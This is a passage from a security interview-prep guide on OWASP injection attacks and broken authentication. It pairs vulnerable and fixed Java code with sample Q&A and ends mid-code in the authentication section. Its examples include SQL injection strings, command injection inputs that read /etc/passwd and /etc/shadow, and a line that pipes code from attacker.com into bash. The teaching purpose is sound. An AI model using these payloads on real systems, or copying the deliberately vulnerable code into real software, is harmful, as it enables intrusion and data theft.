---
layout: default
title: "Security - L1 OWASP Top 10"
parent: "Security"
nav_order: 2
permalink: /security/l1-owasp-top-10/
render_with_liquid: false
---

## Keywords in This File
{: .no_toc }

| # | Keyword | Weight |
|---|---|---|
| 1 | [Injection Attacks: SQL Injection and Command Injection](#injection-attacks-sql-injection-and-command-injection) | critical |
| 2 | [Broken Authentication and Session Management](#broken-authentication-and-session-management) | critical |
| 3 | [XSS, CSRF, and CORS Security](#xss-csrf-and-cors-security) | critical |

---

# Injection Attacks: SQL Injection and Command Injection

---
id: SEC-004
title: "Injection Attacks: SQL Injection and Command Injection"
category: Security
difficulty: ★☆☆
interview_weight: critical
asked_at: All
seniority: all
tags: #security, #sql-injection, #command-injection, #owasp, #injection
status: draft
sd: false
version: 1
---

🎯 Interview Weight: Critical - OWASP A03 and the single most-asked security
question in backend engineering interviews; interviewers expect every developer
to know this without hesitation.

---

### 🎯 Model Answer

**30 seconds:**
> Injection attacks occur when attacker-controlled data is interpreted as code
> rather than as a value. SQL injection places attacker-controlled SQL syntax into
> a query; command injection places attacker-controlled OS commands into a shell
> execution. The fix is always the same: separate code from data using parameterized
> queries, prepared statements, or safe APIs that never pass user input to an
> interpreter.

**3 minutes (Senior):**
> Injection has been in the OWASP Top 10 since its inception because it is simple
> to exploit and devastating in impact. The root cause is always the same: untrusted
> input is concatenated into a string that gets interpreted by an engine - a database,
> a shell, an LDAP directory, an XML parser. The attacker's goal is to escape the
> data context and enter the code context. For SQL injection: the attacker closes a
> string literal with a single quote, then appends valid SQL. For command injection:
> the attacker appends shell metacharacters (`;`, `&&`, `|`) to escape one command
> and inject another. I have seen SQL injection used not just to extract data but
> to write files to the filesystem (SELECT INTO OUTFILE) and execute OS commands
> (xp_cmdshell on MSSQL). The non-obvious point is that injection is not just a
> web vulnerability - it applies to any layer that builds queries or commands from
> data: NoSQL (MongoDB operator injection), LDAP, GraphQL, email headers, and
> OS commands in shell scripts. The prevention is structural: use interfaces that
> separate code from data - parameterized queries, ORMs, or command APIs with
> argument arrays rather than shell-interpreted strings.

**Framework:** ROOT CAUSE (data interpreted as code) → MECHANISM (how interpreters parse input) → IMPACT (data exfiltration, RCE) → PREVENTION (parameterization, separation)

*Adapting up:* Senior/staff should discuss second-order SQL injection (where
sanitized data is stored and later used unsafely), NoSQL injection, and
how ORMs can still be vulnerable if native queries are used.

*Adapting down:* Junior - "SQL injection is putting SQL code into an input field
to manipulate the database query. The fix is parameterized queries."

**Blank Mind Recovery:**

**(1) Restate:** "You are asking about injection attacks - let me think through
what makes them possible."

**(2) First principles:** "When a program builds a command string by concatenating
user input, the program cannot distinguish between input that is data and input
that is code. That ambiguity is the vulnerability."

**(3) Bridge:** "This is similar to shell escaping in the terminal. When you forget
to quote a variable in bash, special characters change the command meaning.
Injection is the same problem applied to databases and OS commands."

---

### 📘 Concept Explanation

**What it is:**
Injection attacks exploit the failure to separate code from data when constructing
interpreted strings. The attacker supplies input that contains control characters
or syntax for the target interpreter, causing the interpreter to execute
attacker-intended commands in addition to or instead of the intended operation.

**The problem it solves:**
Injection prevention solves the problem of dynamic query/command construction
from untrusted input. Before parameterized queries existed, every application
had to manually sanitize every input - a fragile approach where a single missed
character breaks the defense.

**How it works:**

```
SQL INJECTION FLOW:
  Code builds:  SELECT * FROM users WHERE user='{INPUT}'
  Normal input: admin       -> WHERE user='admin'
  Attack input: admin'--    -> WHERE user='admin'--'
                             --  comments out rest of query
  Attack input: ' OR 1=1-- -> WHERE user='' OR 1=1--
                             returns ALL rows
  Attack input: '; DROP TABLE users;--
                             executes second statement!
```

```
COMMAND INJECTION FLOW:
  Code builds:  ping {HOST}
  Normal input: google.com     -> ping google.com
  Attack input: google.com; ls -> ping google.com; ls
                                  lists server files!
  Attack input: google.com && cat /etc/passwd
                                  reads password file!
```

> **Code walkthrough:** (1) WHAT IT SHOWS: how command injection works when user input is interpolated into a shell command string. (2) KEY MECHANISM: the shell parses the concatenated command as a single string; `&&` and `;` are shell operators that sequence commands, so the attacker appends arbitrary OS commands after the legitimate one. (3) WHY IT MATTERS: command injection is an instant full-server compromise - `/etc/passwd`, arbitrary file reads, reverse shells, data exfiltration. (4) WHAT BREAKS: denylisting `;`, `&&`, `|` fails because there are dozens of ways to inject commands depending on the shell; structural prevention (ProcessBuilder with argument arrays) eliminates the attack class. (5) TAKEAWAY: never build shell commands with string concatenation; use ProcessBuilder with an explicit argument array so no shell parsing occurs.

**The key insight:**
Injection is not an input validation problem - it is an architecture problem.
You cannot reliably sanitize all injection payloads because every interpreter
has different special characters and escape rules. The solution is structural:
use parameterized APIs that mechanically separate data from code so the
interpreter never sees user input as syntax.

**When to use parameterized queries:**
Every time. There is no situation where string-concatenated SQL is acceptable
in production code. The same applies to OS command construction: use APIs that
accept argument arrays (ProcessBuilder in Java) not shell-interpreted strings.

**When NOT to use raw string construction:**
Never build SQL, OS commands, LDAP queries, XML, or HTML by string-concatenating
user input, even with escaping/sanitization. Escaping is error-prone and
interpreter-specific; parameterization is universal and reliable.

**Alternatives:**
- ORM (Hibernate, JPA, Django ORM) - auto-generates parameterized queries
- Query builders (JOOQ, Knex) - typed, parameterized query construction
- Stored procedures - separate query definition from input (still need parameterization within stored procedures)

**First-principles derivation:**
An interpreter parses a string and identifies tokens: literal strings, keywords,
operators. If user input contains characters that the interpreter treats as
tokens (single quotes in SQL, semicolons in shell), the parsing result changes.
The only reliable fix is to pass user input through a channel the interpreter
will never parse as syntax - a parameter binding. The database driver then handles
the escaping correctly for its specific SQL dialect.

---

### 💻 Code Example

```java
// BAD: SQL injection via string concatenation
@Repository
public class VulnerableProductRepo {
    @Autowired DataSource ds;

    public List<Product> search(String name)
            throws SQLException {
        // Attacker input: ' UNION SELECT username,
        //   password,3,4 FROM users--
        String sql = "SELECT id, name, price, desc "
            + "FROM products WHERE name LIKE '%"
            + name + "%'";
        // This executes attacker-supplied SQL!
        try (var stmt = ds.getConnection()
                .createStatement()) {
            return mapResults(stmt.executeQuery(sql));
        }
    }
}
```

> **Code walkthrough:** (1) WHAT IT SHOWS: a UNION-based SQL injection where the attacker appends a UNION SELECT to the query to extract data from the users table alongside product results. (2) KEY MECHANISM: single quotes in the input close the LIKE string literal, allowing the attacker to append valid SQL syntax that the database executes. (3) WHY IT MATTERS: UNION injection is used to exfiltrate entire databases through a search endpoint - the attacker iterates over all tables and extracts their contents via paginated queries. (4) WHAT BREAKS: the attacker's UNION SELECT returns password hashes alongside search results, visible in the API response; the entire database is exfiltrated in minutes. (5) TAKEAWAY: any SQL built by string concatenation of user input is injectable, regardless of context (LIKE, WHERE, ORDER BY).

```java
// GOOD: Parameterized PreparedStatement
@Repository
public class SecureProductRepo {
    @Autowired DataSource ds;

    public List<Product> search(String name)
            throws SQLException {
        // ? placeholder - driver binds as string literal
        String sql = "SELECT id, name, price, desc "
            + "FROM products WHERE name LIKE ?";
        try (var conn = ds.getConnection();
             var stmt = conn.prepareStatement(sql)) {
            // % wildcards in the bound value, not in SQL
            stmt.setString(1, "%" + name + "%");
            return mapResults(stmt.executeQuery());
        }
    }
}
```

> **Code walkthrough:** (1) WHAT IT SHOWS: a PreparedStatement with a parameterized LIKE query - the % wildcards are part of the bound value, not part of the SQL template. (2) KEY MECHANISM: the JDBC driver sends the query template and parameter values as separate protocol messages; the database engine receives them in different parsing contexts and will never interpret the parameter value as SQL syntax. (3) WHY IT MATTERS: this is injection-proof regardless of what the attacker puts in name - single quotes, UNION keywords, semicolons are all treated as literal string characters. (4) WHAT BREAKS: the only remaining risk is if the % wildcard itself causes performance problems on large datasets (leading wildcard prevents index use) - a performance issue, not a security issue. (5) TAKEAWAY: parameterization works by mechanical separation of code and data, not by escaping; it is fundamentally stronger than sanitization.

```java
// DANGEROUS: OS command injection
public class VulnerableNetworkTool {
    // BAD: shell=true with user input - command injection
    public String ping(String host) throws IOException {
        // Attacker input: google.com; cat /etc/shadow
        Runtime rt = Runtime.getRuntime();
        String cmd = "ping -c 4 " + host;
        Process p = rt.exec(new String[]{
            "sh", "-c", cmd  // sh -c interprets metacharacters!
        });
        return readOutput(p);
    }
}

// CORRECT: Argument array avoids shell interpretation
public class SecureNetworkTool {
    private static final Set<String> ALLOWED_HOSTS =
        Set.of("db.internal", "cache.internal");

    public String ping(String host) throws IOException {
        // Allowlist validation first
        if (!ALLOWED_HOSTS.contains(host)) {
            throw new SecurityException(
                "Host not in allowlist: " + host);
        }
        // ProcessBuilder with array - no shell parsing!
        ProcessBuilder pb = new ProcessBuilder(
            "ping", "-c", "4", host
        );
        pb.redirectErrorStream(true);
        return readOutput(pb.start());
    }
}
```

> **Code walkthrough:** (1) WHAT IT SHOWS: the contrast between shell-interpreted command construction (vulnerable) and ProcessBuilder with argument arrays (safe) - the argument array passes each element directly to the OS without shell parsing. (2) KEY MECHANISM: `sh -c "command"` passes the entire string to a shell interpreter that expands metacharacters; `ProcessBuilder(array)` calls execv(2) directly, treating each array element as a literal argument with no interpretation. (3) WHY IT MATTERS: command injection with shell execution can be as severe as RCE (Remote Code Execution) - an attacker can read secrets, install backdoors, or pivot to other services. (4) WHAT BREAKS: using ProcessBuilder with an array still has a path traversal risk if the first argument (the program name) is user-controlled; always use absolute paths for the executable. (5) TAKEAWAY: allowlist validation plus argument array construction is the safe pattern for any feature that invokes external processes.

---

### 🎓 Answers by Seniority

**Junior / Mid (0-5 years):**
> SQL injection is when an attacker puts SQL code into an input field to
> change what the database query does. The fix is using PreparedStatements
> or parameterized queries - never build SQL by string concatenation. Command
> injection is the same idea applied to OS commands. Same fix: use argument
> arrays, not shell-interpreted strings.

*Push deeper:* Show you can recognize injection-vulnerable code in a PR review.
Name one other injection type beyond SQL (LDAP injection, NoSQL injection, SSTI).

---

**Senior / Staff (5+ years):**
> Injection is a structural problem: the code is building a string that will be
> interpreted as code, and it includes untrusted data in that string. The fix is
> structural too: use APIs that mechanically separate code (the query template)
> from data (the parameters). In practice, this means parameterized queries
> everywhere SQL is used, ORMs for greenfield development, and ProcessBuilder
> argument arrays for OS commands. The subtle case I watch for is second-order
> injection: data is safely stored (parameterized) but then retrieved and used
> in a dynamically constructed query without parameterization. This appears safe
> because the data was "sanitized on input" but the vulnerability is in the read
> path, not the write path.

*Push deeper:* Discuss ORM injection risks - `nativeQuery = true` in Spring Data
JPA bypasses parameterization; Hibernate HQL is safer than SQL but still
vulnerable to HQL injection if built by concatenation.

---

### ⚠️ Common Misconceptions

**Misconception 1: Input sanitization/escaping is sufficient to prevent SQL injection.**

Escaping is dialect-specific (MySQL vs PostgreSQL vs MSSQL have different escape
rules), inconsistently applied, and has known bypass techniques. Parameterized
queries are mechanically guaranteed to separate data from code at the driver level.
Escaping is a fallback for legacy code; parameterization is the standard.

**Misconception 2: ORMs eliminate injection risk.**

ORMs reduce injection risk by defaulting to parameterized queries, but they do
not eliminate it. Any ORM that supports native SQL queries (`nativeQuery=true` in
JPA, `db.raw()` in Knex) can be used to introduce injection if user input is
concatenated into those queries. ORM use requires the same discipline as direct
JDBC.

**Misconception 3: SQL injection only reads data - it can't change anything.**

SQL injection can execute INSERT, UPDATE, DELETE, and DROP statements if the
database user has those permissions (which is common). On MSSQL, `xp_cmdshell`
allows executing OS commands from SQL. On MySQL, `INTO OUTFILE` writes files
to the server filesystem. Injection can lead to complete server compromise,
not just data exfiltration.

---

### 🚨 Failure Modes and Diagnosis

**Failure Mode 1: Injection in dynamic ORDER BY or LIMIT clauses.**

Symptom: parameterized queries used everywhere but one dynamic sort feature
is vulnerable because `ORDER BY column_name` cannot use parameter placeholders.
Diagnosis: audit all queries where column names, table names, or SQL keywords
are dynamic. Fix: use an allowlist of permitted values, not user input directly:
`if (!ALLOWED_SORT_COLUMNS.contains(sortCol)) throw new IllegalArgumentException`.

**Failure Mode 2: Blind SQL injection goes undetected.**

Symptom: the application returns no data from injection but shows different
responses for true vs false conditions - attacker extracts data bit by bit.
Diagnosis: check logs for excessive requests to a single endpoint with varying
input; use a WAF with SQL injection signature detection; run automated DAST
(OWASP ZAP) regularly to detect blind injection.

**Failure Mode 3: Second-order injection.**

Symptom: stored data is safely inserted but later used in a dynamically
constructed query without parameterization.
Example: username stored safely, then used in `SELECT * FROM logs WHERE user='`
+ username + `'` when generating a report.
Diagnosis: code review audit of all query-construction paths, not just the
endpoints that directly receive user input.

---

### ⚖️ Comparison Table

*(Omit: ★☆☆. Injection is a vulnerability class, not a technology with alternatives. Prevention options are discussed in the Code Example.)*

---

### 🏛️ System Design

*(Omit: ★☆☆ foundational. Injection prevention in distributed system design covered in L3+ entries.)*

---

### 📊 Diagram

*(Omit: the ASCII flow diagrams in Concept Explanation clearly illustrate injection mechanics.)*

---

### 🎯 Interview Deep-Dive

| Question Category | Count | Coverage |
|---|---|---|
| Definition | 1 | What injection is, root cause |
| Mechanism | 2 | How SQL/command injection work |
| Scenario | 2 | Code review, designing prevention |
| Debugging | 1 | Detecting injection in production |
| Trade-off | 1 | ORM vs native queries |

---

**[JUNIOR] Q1 (Definition): What is SQL injection and why is it dangerous?**

SQL injection is a vulnerability where attacker-controlled input is interpreted
as SQL syntax rather than as a string literal value, allowing the attacker to
modify the SQL query that the application executes.

It is dangerous for multiple reasons. First, it can be exploited with zero
authentication - an attacker with only network access to a web application can
often exploit SQL injection without any account. Second, the impact is
comprehensive: read the entire database, modify or delete records, bypass
authentication, and in some configurations execute OS commands.

Consider a login query built like this: `SELECT * FROM users WHERE username='` +
username + `' AND password='` + password + `'`. An attacker enters username as
`admin'--`. The resulting query is `SELECT * FROM users WHERE username='admin'--'
AND password='anything'`. The `--` comments out the password check, and the query
returns the admin user. The attacker is now logged in as admin.

Third, SQL injection is trivial to automate. Tools like sqlmap can automatically
detect and exploit SQL injection, extract entire databases, and test for injection
points across hundreds of parameters with no manual effort.

*What separates good from great:* Understanding that SQL injection is not just a
web application vulnerability. It affects any layer that builds queries dynamically:
APIs, ETL pipelines, reporting tools, admin scripts. Any code that concatenates
user-supplied data into SQL is potentially vulnerable, regardless of where it runs.

---

**[MID] Q2 (Mechanism): Walk me through how a UNION-based SQL injection attack works.**

A UNION-based injection uses the SQL UNION operator to append a second SELECT
statement to the original query, extracting data from other tables.

The attacker first needs to determine two things: (1) how many columns the
original query returns, and (2) which columns are displayable (rendered in the
response). They probe by injecting `ORDER BY 1`, `ORDER BY 2`, etc. until the
query errors - that tells them the column count.

Then they inject a UNION SELECT with the same number of columns: `' UNION SELECT
null, null, null--`. If that returns results, the query structure is confirmed.

Next they identify injectable columns: `' UNION SELECT 'a', null, null--`. If
'a' appears in the response, column 1 is injectable.

Now they extract data: `' UNION SELECT username, password, null FROM users--`.
This returns usernames and password hashes alongside the original query's results.
With the full users table, they can run the hashes through offline cracking.

For databases without column name knowledge, they query the information schema:
`' UNION SELECT table_name, null, null FROM information_schema.tables--` to get
all table names, then `' UNION SELECT column_name, null, null FROM
information_schema.columns WHERE table_name='users'--` to get column names.

An attacker can exfiltrate an entire production database through a single
injectable parameter, making one record per request, with no rate limiting.

*What separates good from great:* Understanding that UNION injection requires the
injected query to return the same number of columns with compatible types.
Attackers use `null` as placeholder values because null is compatible with any
column type, making the detection step reliable across databases.

---

**[MID] Q3 (Mechanism): How does command injection differ from SQL injection?**

Command injection and SQL injection share the same root cause - untrusted data
interpreted as code - but they target different interpreters with different
exploitation mechanics and different impact.

SQL injection targets the database query parser. The injected payload must be
valid SQL syntax for the target database. The attacker's goal is typically data
extraction, authentication bypass, or data modification. Exploitation requires
knowledge of the database schema.

Command injection targets the OS shell interpreter. The injected payload uses
shell metacharacters: semicolons (;) to end one command and start another,
ampersands (&&, &) for conditional or parallel execution, pipe (|) for chaining,
backticks or $() for command substitution. Command injection typically leads to
Remote Code Execution - the attacker can run any OS command the web server process
has permission to run. This is often more severe than SQL injection because it
gives direct access to the OS layer, not just the database.

Example of command injection in a diagnostics endpoint:

Vulnerable code executes: `sh -c "ping -c 4 " + userInput`

Attacker input: `8.8.8.8; curl attacker.com/backdoor | bash`

The server downloads and executes arbitrary code from the attacker's server.

Prevention: for SQL, parameterized queries. For OS commands, use ProcessBuilder
with argument arrays (no shell) and an allowlist of permitted values. Never use
`sh -c`, `Runtime.exec(String)`, `eval()`, or equivalents with user-controlled input.

*What separates good from great:* Knowing that command injection often occurs in
unexpected places - not just network utilities but file processing scripts,
log parsers, system monitoring tools. Anywhere a shell is involved and user
data flows through it.

---

**[SENIOR] Q4 (Scenario): During a code review, a colleague shows you this code.
Identify all injection risks: `String q = "SELECT * FROM orders WHERE status='" + status + "' AND date > '" + date + "' ORDER BY " + sortField`**

This single query has three injection vulnerabilities:

First, the `status` parameter uses single-quote-delimited string concatenation.
An attacker who controls status can inject SQL: `' OR '1'='1` would return all
orders regardless of status. This is classic WHERE clause injection.

Second, the `date` parameter has the same issue. An attacker who controls date
can inject after the date string. If there is no server-side date validation,
they could inject here too.

Third, and most subtle: the `ORDER BY sortField` clause cannot use a parameter
placeholder. SQL does not allow parameterizing column names - you can only
parameterize values. However, directly using user input in ORDER BY allows
column name injection, which can be used to probe the schema (`ORDER BY
(SELECT column_name FROM information_schema.columns LIMIT 1)`) or
cause errors that reveal database structure.

Fixes: For status and date: use PreparedStatement with `?` placeholders. For
sortField: use an allowlist. Define `Set<String> ALLOWED_SORT_FIELDS = Set.of
("created_at", "total", "status")` and validate that sortField is in this set
before using it in the query. If it is not in the set, throw IllegalArgumentException
or use the default sort column.

I would also add a comment in the PR: all three parameters need fixing, but the
ORDER BY case is the most instructive - it demonstrates why parameterization does
not solve all cases and why a secure-coding checklist item for dynamic SQL
keywords is necessary.

*What separates good from great:* Catching the ORDER BY case, which most engineers
who know about parameterized queries still miss. Column names and SQL keywords
(ORDER BY, GROUP BY) cannot be parameterized - they require allowlist validation.

---

**[SENIOR] Q5 (Scenario): Design the injection prevention layer for a REST API
that accepts dynamic filter parameters (e.g., /users?filter[age]=25&filter[name]=john).**

Dynamic filter parameters are a common injection risk because the filter keys
(column names) are user-controlled. My approach is a type-safe query builder
with strict allowlisting.

Layer 1 - input validation: Define the set of filterable fields as an enum or
constant set: `Set<String> FILTERABLE_FIELDS = Set.of("age", "name", "email",
"status")`. Validate every incoming filter key against this set before processing.
Return 400 Bad Request for unknown fields.

Layer 2 - type validation: For each allowed field, define the expected type
(age is an integer, name is a string, status must be from an enum). Validate and
parse the value to the expected type before passing to the query builder. This
prevents type coercion attacks.

Layer 3 - query builder with parameterization: Use a query builder (JOOQ,
QueryDSL, or Criteria API in JPA) that generates parameterized queries from
the typed filter objects. The builder handles the translation from field names
(the allowlisted set) to column references, ensuring column names come from
application constants, not user input.

```java
// Type-safe filter building
Map<String, Object> filters = parseAndValidateFilters(
    request.getParameters()); // validates keys and types

Condition condition = DSL.noCondition();
for (var entry : filters.entrySet()) {
    // entry.getKey() was validated against allowlist
    Field<Object> col = DSL.field(
        FIELD_TO_COLUMN.get(entry.getKey()));
    condition = condition.and(col.eq(entry.getValue()));
}
return dsl.select().from(USERS).where(condition).fetch();
```

> **Code walkthrough:** (1) WHAT IT SHOWS: using JOOQ's type-safe query builder with an allowlist of permitted column names to safely support dynamic filtering without SQL injection risk. (2) KEY MECHANISM: JOOQ generates parameterized queries at the library level; even though column identifiers come from application code, the values are always bound parameters; user input determines WHICH allowlisted field is queried, not the SQL text. (3) WHY IT MATTERS: parameterized queries protect value positions; column name positions cannot be parameterized - the allowlist `FIELD_TO_COLUMN` map is the guard that prevents attacker-controlled identifiers. (4) WHAT BREAKS: if the map includes all database columns (not a restricted subset), an attacker can query sensitive columns by name even without SQL injection. (5) TAKEAWAY: for dynamic column selection, maintain an explicit allowlist; any column not in the list returns a 400, protecting both security and schema stability.

The query generated by JOOQ uses bind parameters for values even though column
names come from application constants (not user input).

*What separates good from great:* Recognizing that the allowlist must be maintained
- when a new column is added to the table, it should not automatically become
filterable. The allowlist must be explicitly updated to add new filterable fields.

---

**[SENIOR] Q6 (Debugging): Your application is being SQL-injected. How do you
detect it, confirm it, and determine what was extracted?**

Detection: check the application logs and database query logs for anomalous
patterns. SQL injection attempts leave recognizable patterns: single quotes in
query parameters, SQL keywords (UNION, SELECT, FROM, WHERE, DROP) in unusual
places, abnormally long parameter values, large numbers of requests with
incrementally varying payloads (sqlmap's automated probing pattern).

Confirmation: query the database slow query log and error log. Injection attempts
often cause database errors (syntax errors from malformed injected SQL). The
database error log shows the exact query that caused the error, including the
injected payload.

Determining what was extracted: if the attack was successful, look for what
was returned in the application response. Check access logs for response sizes
larger than normal for the affected endpoint (UNION injection returns extra rows,
increasing response size). If logging is insufficient, query the database's
audit log (if enabled) for unusual SELECT patterns against sensitive tables
(users, sessions, payment_methods).

Forensic query: `SELECT * FROM pg_stat_activity WHERE query LIKE '%information_
schema%' OR query LIKE '%UNION%'` to find recent injection-related queries in
PostgreSQL. MySQL: check the general query log (if enabled) or the binary log
for anomalous statements.

Incident response: patch the injection point immediately (parameterize or
disable the endpoint). Reset all credentials (database passwords, API keys).
Rotate session tokens (log out all users). Notify affected users if PII was
accessed (GDPR mandates 72-hour breach notification).

*What separates good from great:* Recognizing that SQL injection attacks often
leave no trace if the database audit log is not enabled. Enabling the database
audit log before an incident is essential for forensic investigation. "Log after
breach" means you log events you cannot reconstruct retroactively.

---

**[STAFF] Q7 (Trade-off): When should you use an ORM versus native SQL, given
injection risk?**

ORMs (Hibernate, JPA, Django ORM) provide injection safety as a default because
all generated queries are parameterized. They also reduce boilerplate and provide
type safety. For simple CRUD operations, ORMs are the right choice.

The cases where native SQL is justified: complex analytical queries with multiple
JOINs and window functions that the ORM cannot express efficiently; performance-
critical queries where the ORM's generated SQL has poor execution plans; database-
specific features (PostgreSQL's JSONB operators, MySQL's full-text search).

When using native SQL in ORM contexts: Spring Data JPA's `@Query(nativeQuery =
true, value = "SELECT * FROM users WHERE name = :name")` with named parameters
is safe. The risk is when developers write `@Query(nativeQuery = true, value =
"SELECT * FROM users WHERE name = '" + name + "'")` - bypassing ORM safety to
use string concatenation. Code review must catch this pattern.

The org-level trade-off: teams with mixed ORM/native SQL usage have higher
injection risk than teams with a consistent strategy. If your policy is "ORM
only" with an explicit approval process for native SQL, injection risk is lower
and the code is easier to audit. If policy is "use whatever is convenient," the
audit burden increases proportionally.

My recommendation: default to ORM for all standard queries; create a typed query
builder wrapper for complex cases that still generates parameterized queries; use
native SQL only for extreme performance cases with mandatory code review by a
security-aware engineer.

*What separates good from great:* Understanding that the ORM is not a silver
bullet. Even ORMs can produce injection-vulnerable code if the developer uses
the ORM's escape hatches incorrectly. Security tools like Semgrep should have
rules that detect string concatenation in native queries even in ORM contexts.

---

---

# Broken Authentication and Session Management

---
id: SEC-005
title: "Broken Authentication and Session Management"
category: Security
difficulty: ★☆☆
interview_weight: critical
asked_at: All
seniority: all
tags: #security, #authentication, #session-management, #owasp, #credentials
status: draft
sd: false
version: 1
---

🎯 Interview Weight: Critical - OWASP A07; asked in every security interview for backend and full-stack roles; broken auth is the entry point to most account takeover attacks.

---

### 🎯 Model Answer

**30 seconds:**
> Broken authentication means the authentication mechanism can be bypassed or
> abused - weak passwords accepted, no rate limiting on login attempts, sessions
> never expire, or session tokens predictable. The defense is multi-layered: use
> bcrypt for passwords (never MD5 or SHA-1), enforce MFA, expire sessions on logout,
> use cryptographically random session IDs, and rate-limit authentication endpoints.

**3 minutes (Senior):**
> Authentication is where most account takeovers begin, so it needs defense-in-depth.
> I think about three layers: credential security, session security, and brute-force
> resistance. For credentials: bcrypt with a cost factor of 12+ (adjustable as
> hardware improves), never store plaintext or reversible forms. For sessions:
> generate session tokens with at least 128 bits of cryptographic randomness; set
> HttpOnly and Secure cookie flags; expire sessions after inactivity; invalidate
> the session token on logout (not just delete the cookie client-side). For
> brute-force resistance: rate limiting on authentication endpoints (5 attempts
> per minute per IP or per account), account lockout or progressive delay after
> failed attempts, and CAPTCHA after repeated failures. The non-obvious failure
> mode I have seen most often is incomplete logout: the server removes the cookie
> but does not invalidate the session on the server side. The cookie is gone from
> the browser but the session token is still valid - an attacker who captured
> the token can continue using it. True logout requires server-side session
> invalidation.

**Framework:** CREDENTIAL SECURITY → SESSION LIFECYCLE → BRUTE-FORCE RESISTANCE → RECOVERY FLOWS

*Adapting up:* Senior/staff should discuss MFA implementation, SSO security,
and OAuth token lifecycle management (access token expiry, refresh token rotation).

*Adapting down:* Junior - "Use bcrypt for passwords, don't store them plaintext,
use HTTPS, and make session tokens expire."

**Blank Mind Recovery:**

**(1) Restate:** "You are asking about authentication security - let me work through
the authentication lifecycle and where it can break."

**(2) First principles:** "Authentication proves who you are. It can fail at three
points: storing credentials (if storage is weak), validating them (if validation
is bypassable), or managing the session that proves you authenticated (if sessions
are predictable or never expire)."

**(3) Bridge:** "This is similar to physical access control. A door lock is broken
if the key can be copied (weak password hash), if there's a door without a lock
(no rate limiting), or if the access badge works after it should be revoked
(session not invalidated on logout)."

---

### 📘 Concept Explanation

**What it is:**
Broken authentication and session management covers vulnerabilities where the
authentication mechanism can be circumvented, credentials compromised, or
sessions hijacked. It is OWASP A07 (2021) and represents the second-most exploited
vulnerability category in web applications after broken access control.

**The problem it solves:**
Authentication is the gateway to all user-specific data and functionality.
Bypassing it - through credential theft, session prediction, or brute force -
gives an attacker the equivalent of a legitimate user session. The challenge is
that authentication is complex (many interacting components: storage, validation,
session management, recovery flows) and each component has multiple failure modes.

**How it works:**

```
AUTHENTICATION LIFECYCLE:
  Registration:  user creates credential
                 -> hash password with bcrypt(12)
                 -> store hash, never plaintext
  Login:         user supplies credential
                 -> rate limit (5 req/min/IP)
                 -> compare with bcrypt.verify()
                 -> issue cryptographically random session token
                 -> set Secure, HttpOnly, SameSite=Strict cookie
  Session use:   client sends session token in cookie
                 -> server validates token against session store
                 -> check expiry (idle timeout: 30min, absolute: 8hr)
  Logout:        -> delete session from server store
                 -> clear cookie (set max-age=0)
                 -> do NOT just clear cookie without server delete
  Recovery:      -> time-limited, single-use reset token
                 -> send via side channel (email)
                 -> invalidate old sessions on password change
```

> **Code walkthrough:** (1) WHAT IT SHOWS: the full session token lifecycle from creation through logout and recovery, with the correct security action at each step. (2) KEY MECHANISM: the session token is the credential after login; its lifecycle must match the security boundary - short validity, single-use regeneration on privilege change, explicit server-side invalidation on logout. (3) WHY IT MATTERS: incomplete logout (client-side cookie clear without server invalidation) leaves the session replayable; an attacker with a captured token can authenticate indefinitely if the server has no record of invalidation. (4) WHAT BREAKS: storing sessions only in a JWT without a server-side revocation list makes logout cosmetic - the token remains valid until expiry. (5) TAKEAWAY: logout must invalidate the server-side session record; token rotation on login prevents session fixation; never rely on cookie deletion alone for security.

**The key insight:**
Session management is the most commonly broken authentication component.
Developers focus on credential strength (password hashing) but neglect
the session lifecycle - predictable tokens, incomplete logout, no idle
timeout, no absolute timeout. A correctly stored password is worthless
if the session token can be predicted or never expires.

**When to use it:**
Apply strong authentication practices to every system that handles any
user-specific data. "Internal tools" and "low-sensitivity systems" still need
authentication - they are often the stepping stone to more sensitive systems.

**When NOT to use it:**
No anti-patterns here - strong authentication is always required. The question
is calibrating the strength of each control to the sensitivity of the system.

**Alternatives:**
- SSO with an identity provider (Okta, Auth0, Keycloak) - delegate auth complexity
- Passwordless (WebAuthn, magic links) - eliminates credential storage risk
- OAuth 2.0 / OIDC - federated identity for API access

**First-principles derivation:**
Any multi-user system needs to identify which user is making each request.
It does this by: (1) establishing identity once (authentication - prove you are you),
(2) issuing a token that represents that identity for subsequent requests (session),
(3) validating the token on every request. Each step introduces failure modes:
identity establishment can be brute-forced; tokens can be predicted, stolen, or
never expired; validation can be skipped or bypassed.

---

### 💻 Code Example

```java
// BAD: Weak password storage and incomplete session mgmt
@Service
public class WeakAuthService {
    // BAD 1: MD5 hash - trivially reversible
    public String hashPassword(String pw) {
        return DigestUtils.md5Hex(pw); // cracked in seconds
    }

    // BAD 2: Sequential session ID - predictable
    private AtomicInteger sessionCounter = new AtomicInteger(0);
    public String createSession(String userId) {
        String sessionId = "sess_" + sessionCounter
            .incrementAndGet(); // attacker guesses sess_1001
        sessionStore.put(sessionId, userId);
        return sessionId;
    }

    // BAD 3: Client-only logout - server still valid
    public void logout(HttpServletResponse response) {
        Cookie c = new Cookie("session", "");
        c.setMaxAge(0);
        response.addCookie(c); // cookie gone but session lives!
    }
}
```

> **Code walkthrough:** (1) WHAT IT SHOWS: three compounding authentication failures - weak hash, predictable session tokens, and incomplete logout - each independently exploitable. (2) KEY MECHANISM: MD5 produces a fixed-length hash but has no computational cost - a modern GPU cracks 10 billion MD5 hashes per second; sequential session IDs mean attackers can guess valid sessions by incrementing from a known ID. (3) WHY IT MATTERS: these mistakes appear in legacy codebases and student projects; each one enables a different attack path (offline cracking, session prediction, session fixation after logout). (4) WHAT BREAKS: the MD5 password hash is cracked in seconds by rainbow tables; an attacker who observes one session ID (sess_1042) can probe sess_1043 through sess_1045 to hijack other active sessions; logout does not actually terminate the session. (5) TAKEAWAY: password storage, session generation, and session termination each have correct patterns; use them consistently.

```java
// GOOD: bcrypt, secure session, proper logout
@Service
public class SecureAuthService {
    // Cost factor 12: ~250ms per hash on modern hardware
    private final BCryptPasswordEncoder encoder =
        new BCryptPasswordEncoder(12);
    @Autowired private SessionRepository sessions;

    public String hashPassword(String pw) {
        return encoder.encode(pw); // bcrypt with salt
    }

    public boolean verifyPassword(
            String raw, String stored) {
        return encoder.matches(raw, stored);
    }

    // 128-bit cryptographic randomness
    public String createSession(
            String userId, HttpServletResponse resp) {
        byte[] tokenBytes = new byte[16];
        new SecureRandom().nextBytes(tokenBytes);
        String token = Base64.getEncoder()
            .encodeToString(tokenBytes);

        // Store server-side with expiry
        sessions.save(new Session(token, userId,
            Instant.now().plus(Duration.ofHours(8))));

        Cookie c = new Cookie("session", token);
